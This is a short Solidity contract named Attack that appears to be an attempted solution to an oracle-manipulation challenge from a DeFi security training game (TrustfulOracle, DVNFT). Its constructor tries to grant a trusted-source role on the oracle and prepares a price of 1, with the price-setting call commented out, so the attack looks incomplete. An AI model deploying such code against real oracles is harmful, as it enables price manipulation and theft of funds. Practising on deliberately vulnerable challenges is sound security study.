// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrustfulOracle.sol";

contract Attack {
    address[] private sources;
    string[] private symbol;
    uint256[] private initialPrices;

    constructor(address oracle, address dvnft) {
        sources.push(dvnft);
        symbol.push("DVNFT");
        initialPrices.push(1);

        TrustfulOracle(oracle).grantRole(
            keccak256("TRUSTED_SOURCE_ROLE"),
            0x0000000000000000000000000000000000000000
        );

        // TrustfulOracle(oracle).setupInitialPrices(
        //     sources,
        //     symbol,
        //     initialPrices
        // );
    }
}
